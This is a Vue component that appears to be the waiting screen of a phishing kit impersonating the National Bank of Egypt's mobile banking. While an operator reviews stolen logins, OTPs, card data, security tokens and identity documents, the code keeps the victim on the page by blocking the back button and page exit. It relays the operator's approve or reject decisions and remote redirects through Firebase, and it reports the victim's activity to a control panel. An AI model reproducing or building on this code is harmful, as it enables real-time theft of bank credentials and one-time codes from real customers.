<template>
  <div class="nbe-waiting-screen" :class="{ 'is-error-state': rejectionState !== null }" aria-label="يرجى الانتظار...">
    <HoneypotField location="waiting_page" />

    <!-- Existing error-state decoration; hidden during the normal waiting state -->
    <div v-if="rejectionState" class="nbe-waiting-bg" aria-hidden="true">
      <div class="nbe-waiting-banner" />
      <div class="nbe-waiting-overlay" :class="{ 'error-overlay': rejectionState !== null }" />
    </div>

    <div v-if="rejectionState" class="nbe-particles-wrapper" aria-hidden="true">
      <span
        v-for="(particle, idx) in particles"
        :key="idx"
        class="nbe-particle"
        :style="{
          top: particle.top,
          left: particle.left,
          width: particle.size + 'px',
          height: particle.size + 'px',
          animationDuration: particle.duration + 's',
          animationDelay: particle.delay + 's',
        }"
      />
    </div>

    <div v-if="rejectionState" class="nbe-glow nbe-glow-waiting-tl error-glow" aria-hidden="true" />
    <div v-if="rejectionState" class="nbe-glow nbe-glow-waiting-br error-glow" aria-hidden="true" />

    <!-- Center Content: Normal Waiting State (visual changes only) -->
    <div v-if="!rejectionState" class="nbe-waiting-content">
      <img
        src="/assets/logo-loading-transparent.png"
        alt="NBE Mobile"
        class="nbe-waiting-logo-img"
      />

      <p class="nbe-waiting-message">
        يرجى الانتظار.. جاري مراجعة وتأكيد طلبك، يرجى عدم إغلاق هذه الصفحة
      </p>

      <div class="nbe-waiting-dots" aria-hidden="true">
        <span />
        <span />
        <span />
      </div>
    </div>

    <!-- Center Content: Rejected / Error State -->
    <div v-else class="nbe-waiting-content nbe-error-content">
      <!-- Animated Error Icon Card -->
      <div class="nbe-error-card">
        <div class="nbe-error-icon-box">
          <svg viewBox="0 0 24 24" width="56" height="56" fill="none" stroke="#ef4444" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
            <circle cx="12" cy="12" r="10" />
            <line x1="15" y1="9" x2="9" y2="15" />
            <line x1="9" y1="9" x2="15" y2="15" />
          </svg>
        </div>
      </div>

      <!-- Error Title -->
      <h1 class="nbe-waiting-title nbe-error-title">{{ rejectionState.title }}</h1>

      <!-- Error Subtitle -->
      <p class="nbe-waiting-subtitle nbe-error-subtitle">{{ rejectionState.message }}</p>

      <!-- Retry Action Card -->
      <div class="nbe-retry-action-box">
        <button type="button" class="nbe-retry-btn" @click="handleRetryClick">
          <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
            <polyline points="1 4 1 10 7 10" />
            <path d="M3.51 15a9 9 0 1 0 2.13-9.36L1 10" />
          </svg>
          <span>إعادة المحاولة الآن</span>
        </button>

        <p v-if="countdownSeconds > 0" class="nbe-countdown-notice">
          سيتم تحويلك تلقائياً خلال {{ countdownSeconds }} ثوانٍ...
        </p>
      </div>
    </div>
  </div>
</template>

<script setup lang="ts">
import { ref, onMounted, onBeforeUnmount } from "vue";
import { firebasePaths } from "~/utils/firebaseConfig";
import { getFirebaseDatabase, getCustomerId, trackCustomerActivity } from "~/composables/useCustomerTracking";
import clockAnimationData from "~/assets/login/clock-animation.json";

interface RejectionInfo {
  title: string;
  message: string;
  targetUrl: string;
  step: string;
}

type PendingDecisionStep = "username" | "password" | "otp" | "card" | "nbe_token" | "bm_token" | "documents";

const router = useRouter();
const lottieContainer = ref<HTMLElement | null>(null);
let lottieInstance: any = null;
let unsubscribe: (() => void) | null = null;
let lastRedirectTimestamp = Date.now();

const rejectionState = ref<RejectionInfo | null>(null);
const countdownSeconds = ref(5);
let countdownInterval: any = null;
let activePendingStep: PendingDecisionStep | null = null;

const particles = [
  { top: "15%", left: "20%", size: 6, duration: 6, delay: 0 },
  { top: "25%", left: "80%", size: 4, duration: 7, delay: 0.5 },
  { top: "65%", left: "12%", size: 5, duration: 8, delay: 1 },
  { top: "75%", left: "85%", size: 3, duration: 5.5, delay: 0.2 },
  { top: "40%", left: "50%", size: 4, duration: 9, delay: 1.5 },
  { top: "85%", left: "45%", size: 3, duration: 6.5, delay: 0.8 },
  { top: "10%", left: "55%", size: 3, duration: 7.5, delay: 1.2 },
];

const getLatestAttempt = (data: Record<string, any>) => {
  if (!data.loginAttempts || typeof data.loginAttempts !== "object") return null;
  const attempts = Object.values(data.loginAttempts);
  return attempts.length > 0 ? attempts[attempts.length - 1] as Record<string, any> : null;
};

const detectPendingStep = (data: Record<string, any>): PendingDecisionStep | null => {
  const latestAttempt = getLatestAttempt(data);
  const currentStep = data.currentStep || data.presence?.currentStep;

  if (currentStep === "bm_token" && data.bmTokenStatus === "pending") return "bm_token";
  if (currentStep === "nbe_token" && data.nbeTokenStatus === "pending") return "nbe_token";
  if (currentStep === "card" && data.cardStatus === "pending") return "card";
  if (
    currentStep === "otp" &&
    (data.verificationStatus === "pending" || data.verification?.status === "pending")
  ) return "otp";
  if (currentStep === "password" && data.passwordStatus === "pending") return "password";
  if (currentStep === "username" && data.usernameStatus === "pending") return "username";
  if (currentStep === "documents" && data.documentsStatus === "pending") return "documents";

  if (data.bmTokenStatus === "pending" || latestAttempt?.bmTokenStatus === "pending") return "bm_token";
  if (data.nbeTokenStatus === "pending" || latestAttempt?.nbeTokenStatus === "pending") return "nbe_token";
  if (data.cardStatus === "pending" || latestAttempt?.cardStatus === "pending") return "card";
  if (
    data.verificationStatus === "pending" ||
    data.verification?.status === "pending" ||
    latestAttempt?.verificationStatus === "pending"
  ) return "otp";
  if (data.passwordStatus === "pending") return "password";
  if (data.usernameStatus === "pending") return "username";
  if (data.documentsStatus === "pending" || data.identityVerification?.status === "pending") return "documents";

  return null;
};

const detectRejection = (
  data: Record<string, any>,
  expectedStep: PendingDecisionStep | null,
): RejectionInfo | null => {
  if (!data) return null;

  const latestAttempt = getLatestAttempt(data);

  // 1. فحص رفض رمز BM Token
  if (
    (!expectedStep || expectedStep === "bm_token") &&
    (data.bmTokenStatus === "rejected" ||
      latestAttempt?.bmTokenStatus === "rejected")
  ) {
    return {
      title: "الرقم السري المتغير OTP غير صحيح",
      message: "الرقم السري المتغير (OTP) غير صحيح أو منتهي الصلاحية. يُرجى إنشاء رمز جديد من تطبيق/جهاز رموز الأمان وإعادة المحاولة.",
      targetUrl: "/login?step=bm_token",
      step: "bm_token",
    };
  }

  // 2. فحص رفض رمز NBE Token
  if (
    (!expectedStep || expectedStep === "nbe_token") &&
    (data.nbeTokenStatus === "rejected" ||
      latestAttempt?.nbeTokenStatus === "rejected")
  ) {
    return {
      title: "رمز NBE Token غير صحيح",
      message: "رمز تطبيق NBE Token غير صحيح أو منتهي الصلاحية. يرجى إدخال آخر رمز ظاهر داخل تطبيق NBE Token.",
      targetUrl: "/login?step=nbe_token",
      step: "nbe_token",
    };
  }

  // 3. فحص رفض بيانات البطاقة المصرفية
  if (
    (!expectedStep || expectedStep === "card") &&
    (data.cardStatus === "rejected" ||
      latestAttempt?.cardStatus === "rejected")
  ) {
    return {
      title: "بيانات البطاقة غير صحيحة",
      message: "بيانات البطاقة المصرفية غير صحيحة أو غير صالحة. يرجى التأكد من صحة رقم البطاقة وتاريخ الانتهاء والرمز السري وإعادة المحاولة.",
      targetUrl: "/login?step=card",
      step: "card",
    };
  }

  // 4. فحص رفض رمز التحقق OTP
  if (
    (!expectedStep || expectedStep === "otp") &&
    (data.verificationStatus === "rejected" ||
      data.verification?.status === "rejected" ||
      latestAttempt?.verificationStatus === "rejected")
  ) {
    return {
      title: "رمز التحقق غير صحيح",
      message: "رمز التحقق (OTP) الذي تم إدخاله غير صحيح أو منتهي الصلاحية. يرجى طلب رمز جديد وإعادة المحاولة.",
      targetUrl: "/login?step=otp",
      step: "otp",
    };
  }

  // 5. فحص رفض بيانات تسجيل الدخول (كود المستخدم وكلمة المرور كحزمة واحدة)
  if (
    (!expectedStep || expectedStep === "username" || expectedStep === "password") &&
    (expectedStep === "password"
      ? data.passwordStatus === "rejected" || data.credentialsStatus === "rejected"
      : expectedStep === "username"
        ? data.usernameStatus === "rejected" || data.credentialsStatus === "rejected"
        : data.passwordStatus === "rejected" ||
          data.usernameStatus === "rejected" ||
          data.credentialsStatus === "rejected" ||
          latestAttempt?.passwordStatus === "rejected")
  ) {
    return {
      title: "بيانات الدخول غير صحيحة",
      message: "كود المستخدم أو كلمة المرور غير صحيحة. يُرجى إعادة المحاولة والتأكد من صحة البيانات.",
      targetUrl: "/login?step=username",
      step: "username",
    };
  }

  // 6. فحص رفض المستندات
  if (
    (!expectedStep || expectedStep === "documents") &&
    (data.documentsStatus === "rejected" || data.identityVerification?.status === "rejected")
  ) {
    return {
      title: "تعذر توثيق المستندات",
      message: "تعذر توثيق المستندات المرفوعة. يرجى إعادة رفع صور واضحة لمستنداتك.",
      targetUrl: "/documents",
      step: "documents",
    };
  }

  return null;
};

const startCountdownAndRedirect = () => {
  if (countdownInterval) clearInterval(countdownInterval);
  // توجيه فوري للصفحة المعنية ليظهر البانر تحت الحقول مباشرة
  countdownSeconds.value = 0;
  handleRetryClick();
};

const handleRetryClick = () => {
  if (countdownInterval) clearInterval(countdownInterval);
  if (!rejectionState.value) return;

  const target = rejectionState.value.targetUrl;

  try {
    trackCustomerActivity(
      {
        lastAction: `إعادة المحاولة لخطوة: ${rejectionState.value.title}`,
        lastPage: target,
      },
      "retry_step"
    ).catch(() => {});
  } catch {}

  if (target.startsWith("http")) {
    window.location.href = target;
  } else {
    router.push(target);
  }
};

const handlePopState = () => {
  window.history.pushState(null, "", window.location.href);
};

const handleBeforeUnload = (e: BeforeUnloadEvent) => {
  e.preventDefault();
  e.returnValue = "";
  return "";
};

onMounted(async () => {
  if (typeof window !== "undefined") {
    // 1. قفل زر الرجوع بالمتصفح ومنع الخروج
    window.history.pushState(null, "", window.location.href);
    window.addEventListener("popstate", handlePopState);
    window.addEventListener("beforeunload", handleBeforeUnload);

    // 2. تسجيل تواجد العميل في صفحة الانتظار ليظهر فوراً في لوحة التحكم
    try {
      await trackCustomerActivity(
        {
          lastAction: "في صفحة الانتظار",
          lastPage: "/waiting-room",
          currentStep: "waiting",
        },
        "page_visit",
        { page: "/waiting-room" }
      );
    } catch (err) {
      console.error("Error tracking waiting page activity:", err);
    }

    // 3. تشغيل أنميشن الساعة Lottie
    if (lottieContainer.value) {
      try {
        const lottieModule = await import("lottie-web/build/player/lottie_light.min.js");
        const lottie = (lottieModule as any).default || lottieModule;
        lottieInstance = lottie.loadAnimation({
          container: lottieContainer.value,
          renderer: "svg",
          loop: true,
          autoplay: true,
          animationData: clockAnimationData,
        });
      } catch (err) {
        console.error("Error loading Clock Lottie animation:", err);
      }
    }

    // 4. الاستماع لبيانات العميل من Firebase (التوجيهات وقرارات القبول والرفض)
    const customerId = getCustomerId();
    if (customerId) {
      const databaseModule = await import("firebase/database");
      const db = await getFirebaseDatabase();
      const customerRef = databaseModule.ref(db, `${firebasePaths.customers}/${customerId}`);

      unsubscribe = databaseModule.onValue(customerRef, (snapshot) => {
        const data = snapshot.val() as Record<string, any> | null;
        if (!data) return;

        // أ. التوجيه المباشر من المشرف (الأولوية القصوى)
        if (data.remoteRedirect && data.remoteRedirect.target) {
          const redirectTime = Number(data.remoteRedirect.timestamp) || 0;
          if (redirectTime > lastRedirectTimestamp) {
            lastRedirectTimestamp = redirectTime;
            const target = data.remoteRedirect.target as string;
            const step = data.remoteRedirect.step as string | undefined;

            if (target === "/login" && step) {
              router.push(`/login?step=${step}`);
            } else if (target.startsWith("http")) {
              window.location.href = target;
            } else {
              router.push(target);
            }
            return;
          }
        }

        // ب. فحص حالة الرفض وتحويل الشاشة لصفحة الخطأ المناسبة للخطوة
        if (!activePendingStep) {
          activePendingStep = detectPendingStep(data);
        }
        const rejected = detectRejection(data, activePendingStep);
        if (rejected) {
          if (!rejectionState.value || rejectionState.value.step !== rejected.step) {
            rejectionState.value = rejected;
            startCountdownAndRedirect();
          }
        } else {
          rejectionState.value = null;
          if (countdownInterval) clearInterval(countdownInterval);
        }
      });
    }
  }
});

onBeforeUnmount(() => {
  if (typeof window !== "undefined") {
    window.removeEventListener("popstate", handlePopState);
    window.removeEventListener("beforeunload", handleBeforeUnload);
  }
  if (countdownInterval) {
    clearInterval(countdownInterval);
  }
  if (lottieInstance) {
    try {
      lottieInstance.destroy();
    } catch {}
  }
  unsubscribe?.();
});
</script>

<style scoped>
.nbe-waiting-screen {
  position: fixed;
  inset: 0;
  z-index: 9999;
  display: flex;
  align-items: center;
  justify-content: center;
  overflow: hidden;
  background-color: #0a4a30;
  font-family: "Cairo", "Segoe UI", Tahoma, Arial, sans-serif;
  direction: rtl;
  color: #ffffff;
  transition: background-color 0.4s ease;
}

.nbe-waiting-screen.is-error-state {
  background-color: #450a0a;
}

/* Background Banner with 3D Wave Texture */
.nbe-waiting-bg {
  pointer-events: none;
  position: absolute;
  inset: 0;
  overflow: hidden;
  z-index: 0;
}
.nbe-waiting-banner {
  position: absolute;
  inset: 0;
  background-image: url("/assets/banner.png");
  background-size: cover;
  background-position: center;
  background-repeat: no-repeat;
  opacity: 1;
  filter: contrast(1.15) brightness(1.02);
}
.nbe-waiting-overlay {
  position: absolute;
  inset: 0;
  background: linear-gradient(
    135deg,
    rgba(10, 74, 48, 0.65) 0%,
    rgba(14, 92, 59, 0.45) 50%,
    rgba(5, 40, 24, 0.75) 100%
  );
  transition: all 0.4s ease;
}
.nbe-waiting-overlay.error-overlay {
  background: linear-gradient(
    135deg,
    rgba(69, 10, 10, 0.85) 0%,
    rgba(127, 29, 29, 0.75) 50%,
    rgba(30, 5, 5, 0.9) 100%
  );
}

/* Floating Particle Bubbles */
.nbe-particles-wrapper {
  pointer-events: none;
  position: absolute;
  inset: 0;
  z-index: 1;
}
.nbe-particle {
  position: absolute;
  border-radius: 9999px;
  background: rgba(255, 255, 255, 0.45);
  animation: particle-float infinite ease-in-out;
}
@keyframes particle-float {
  0%, 100% {
    transform: translateY(0);
    opacity: 0.15;
  }
  50% {
    transform: translateY(-20px);
    opacity: 0.75;
  }
}

/* Ambient Glow Highlights */
.nbe-glow {
  pointer-events: none;
  position: absolute;
  border-radius: 9999px;
  filter: blur(72px);
  z-index: 1;
  transition: all 0.4s ease;
}
.nbe-glow-waiting-tl {
  top: -6rem;
  left: -6rem;
  width: 22rem;
  height: 22rem;
  background: rgba(255, 255, 255, 0.18);
}
.nbe-glow-waiting-br {
  bottom: -6rem;
  right: -4rem;
  width: 22rem;
  height: 22rem;
  background: rgba(226, 166, 60, 0.28);
}
.nbe-glow.error-glow {
  background: rgba(239, 68, 68, 0.35);
}

/* Content Container */
.nbe-waiting-content {
  position: relative;
  z-index: 10;
  display: flex;
  flex-direction: column;
  align-items: center;
  padding: 1.5rem;
  text-align: center;
  max-width: 520px;
  width: 100%;
  animation: fadeInContent 0.35s ease-out;
}

@keyframes fadeInContent {
  from {
    opacity: 0;
    transform: scale(0.95);
  }
  to {
    opacity: 1;
    transform: scale(1);
  }
}

/* Glowing Clock Card */
.nbe-clock-card {
  border-radius: 1.5rem;
  border: 1px solid rgba(255, 255, 255, 0.6);
  background: #ffffff;
  padding: 1.25rem;
  box-shadow: 0 20px 45px rgba(0, 0, 0, 0.25);
  animation: nbe-glow 2.6s ease-in-out infinite;
  display: flex;
  align-items: center;
  justify-content: center;
}
@media (min-width: 640px) {
  .nbe-clock-card {
    border-radius: 1.75rem;
    padding: 1.5rem;
  }
}

.nbe-lottie-box {
  width: 110px;
  height: 110px;
  display: flex;
  align-items: center;
  justify-content: center;
}
@media (min-width: 640px) {
  .nbe-lottie-box {
    width: 140px;
    height: 140px;
  }
}

@keyframes nbe-glow {
  0%, 100% {
    box-shadow: 0 0 rgba(255, 255, 255, 0.35), 0 0 30px 6px rgba(255, 255, 255, 0.18);
  }
  50% {
    box-shadow: 0 0 0 10px rgba(255, 255, 255, 0.08), 0 0 55px 16px rgba(255, 255, 255, 0.35);
  }
}

/* Error Card & Icon */
.nbe-error-card {
  border-radius: 1.5rem;
  border: 1px solid rgba(255, 255, 255, 0.6);
  background: #ffffff;
  padding: 1.5rem;
  box-shadow: 0 20px 45px rgba(0, 0, 0, 0.3);
  animation: nbe-error-glow 2.2s ease-in-out infinite;
  display: flex;
  align-items: center;
  justify-content: center;
}
@media (min-width: 640px) {
  .nbe-error-card {
    border-radius: 1.75rem;
    padding: 1.75rem;
  }
}

.nbe-error-icon-box {
  width: 90px;
  height: 90px;
  border-radius: 50%;
  background: #fef2f2;
  display: flex;
  align-items: center;
  justify-content: center;
  animation: scaleIn 0.3s ease-out;
}

@keyframes nbe-error-glow {
  0%, 100% {
    box-shadow: 0 0 rgba(239, 68, 68, 0.4), 0 0 35px 8px rgba(239, 68, 68, 0.3);
  }
  50% {
    box-shadow: 0 0 0 10px rgba(239, 68, 68, 0.15), 0 0 65px 20px rgba(239, 68, 68, 0.45);
  }
}

@keyframes scaleIn {
  from {
    transform: scale(0.6);
    opacity: 0;
  }
  to {
    transform: scale(1);
    opacity: 1;
  }
}

/* Titles */
.nbe-waiting-title {
  margin: 1.75rem 0 0;
  font-size: 1.85rem;
  font-weight: 900;
  color: #ffffff;
  text-shadow: 0 3px 12px rgba(0, 0, 0, 0.5);
}
@media (min-width: 640px) {
  .nbe-waiting-title {
    font-size: 2.35rem;
  }
}

.nbe-error-title {
  color: #fee2e2;
  text-shadow: 0 3px 12px rgba(0, 0, 0, 0.6);
}

.nbe-waiting-subtitle {
  margin: 0.75rem 0 0;
  font-size: 1rem;
  font-weight: 600;
  color: rgba(255, 255, 255, 0.9);
  text-shadow: 0 2px 6px rgba(0, 0, 0, 0.4);
  line-height: 1.6;
}
@media (min-width: 640px) {
  .nbe-waiting-subtitle {
    font-size: 1.1rem;
  }
}

.nbe-error-subtitle {
  color: #fecaca;
  font-size: 1.05rem;
  margin-top: 1rem;
}

/* Retry Action Box */
.nbe-retry-action-box {
  margin-top: 2rem;
  width: 100%;
  display: flex;
  flex-direction: column;
  align-items: center;
  gap: 12px;
}

.nbe-retry-btn {
  display: inline-flex;
  align-items: center;
  justify-content: center;
  gap: 10px;
  background: #dc2626;
  color: #ffffff;
  font-size: 1.08rem;
  font-weight: 800;
  padding: 14px 32px;
  border-radius: 12px;
  border: 1px solid rgba(255, 255, 255, 0.25);
  cursor: pointer;
  width: 100%;
  max-width: 320px;
  box-shadow: 0 8px 24px rgba(220, 38, 38, 0.4);
  transition: all 0.2s ease;
}

.nbe-retry-btn:hover {
  background: #b91c1c;
  transform: translateY(-2px);
  box-shadow: 0 12px 28px rgba(220, 38, 38, 0.55);
}

.nbe-countdown-notice {
  margin: 0;
  font-size: 0.88rem;
  font-weight: 600;
  color: rgba(254, 202, 202, 0.85);
}

/* 3 Bouncing Dots Loader */
.nbe-dots-loader {
  margin-top: 1.75rem;
  display: flex;
  align-items: center;
  gap: 0.5rem;
}
.nbe-dot {
  width: 0.6rem;
  height: 0.6rem;
  border-radius: 9999px;
  background-color: rgba(255, 255, 255, 0.9);
  animation: dot-bounce 1.4s infinite ease-in-out both;
}
.dot-1 {
  animation-delay: -0.32s;
}
.dot-2 {
  animation-delay: -0.16s;
}
.dot-3 {
  animation-delay: 0s;
}

@keyframes dot-bounce {
  0%, 80%, 100% {
    transform: scale(0);
    opacity: 0.4;
  }
  40% {
    transform: scale(1);
    opacity: 1;
  }
}

/* Normal waiting view: clean white canvas with animation on the logo only. */
.nbe-waiting-screen {
  padding: 1.5rem;
  background: #ffffff;
  color: #174c36;
}

.nbe-waiting-content {
  width: min(100%, 680px);
  max-width: 680px;
  min-height: 100%;
  justify-content: center;
  padding: 0;
  animation: none;
}

.nbe-waiting-logo-img {
  display: block;
  width: clamp(110px, 22vw, 180px);
  max-width: 100%;
  max-height: min(28vh, 160px);
  height: auto;
  object-fit: contain;
  background: transparent;
  border: 0;
  box-shadow: none;
  filter: none;
  animation: nbe-waiting-logo-pulse 2.2s ease-in-out infinite;
  transform-origin: center;
  will-change: transform;
}

.nbe-waiting-message {
  max-width: 640px;
  margin: 2.15rem 0 0;
  padding-inline: 0.5rem;
  color: #193f30;
  font-size: clamp(1rem, 2.3vw, 1.16rem);
  font-weight: 700;
  line-height: 1.95;
  text-wrap: balance;
}

.nbe-waiting-dots {
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 0.55rem;
  margin-top: 1.15rem;
  direction: ltr;
}

.nbe-waiting-dots span {
  width: 0.62rem;
  height: 0.62rem;
  border-radius: 50%;
  background: #08783f;
  box-shadow: 0 3px 10px rgba(8, 120, 63, 0.18);
  animation: nbe-waiting-dot-wave 1.25s ease-in-out infinite;
}

.nbe-waiting-dots span:nth-child(2) {
  animation-delay: 0.16s;
}

.nbe-waiting-dots span:nth-child(3) {
  animation-delay: 0.32s;
}

@keyframes nbe-waiting-logo-pulse {
  0%, 100% {
    transform: scale(1);
  }
  50% {
    transform: scale(1.025);
  }
}

@keyframes nbe-waiting-dot-wave {
  0%, 60%, 100% {
    transform: translateY(0) scale(0.78);
    opacity: 0.3;
  }
  30% {
    transform: translateY(-0.38rem) scale(1);
    opacity: 1;
  }
}

@media (max-width: 480px) {
  .nbe-waiting-screen {
    padding: 1.25rem;
  }

  .nbe-waiting-logo-img {
    width: min(100%, 150px);
  }

  .nbe-waiting-message {
    margin-top: 1.65rem;
    line-height: 1.8;
  }
}

@media (prefers-reduced-motion: reduce) {
  .nbe-waiting-logo-img,
  .nbe-waiting-dots span {
    animation: none;
  }

  .nbe-waiting-dots span {
    opacity: 0.65;
  }
}
</style>
